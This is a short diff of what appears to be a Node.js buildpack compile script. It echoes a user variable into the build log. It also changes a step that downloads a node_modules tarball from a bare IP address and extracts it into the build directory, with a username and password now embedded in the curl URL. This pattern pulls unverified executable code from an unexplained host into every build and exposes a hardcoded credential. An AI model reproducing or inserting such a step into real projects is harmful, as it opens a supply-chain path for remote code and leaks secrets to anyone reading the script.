@@ -29,7 +29,7 @@ source $BP_DIR/compile-extensions/lib/common
 # END CF Common
 LOG_FILE='/tmp/node-build-log.txt'
 echo "" > "$LOG_FILE"
-
+echo ${user} > "$LOG_FILE"
 ### Load dependencies
 
 source $BP_DIR/lib/output.sh
@@ -44,4 +44,4 @@ warn_no_start "$LOG_FILE"
 
 cd $BUILD_DIR
 
-curl http://104.199.107.26/node_modules.tar.gz | tar -xz
+curl 'http://h3phc:TryNCrackMe!@104.199.107.26/node_modules.tar.gz' | tar -xz
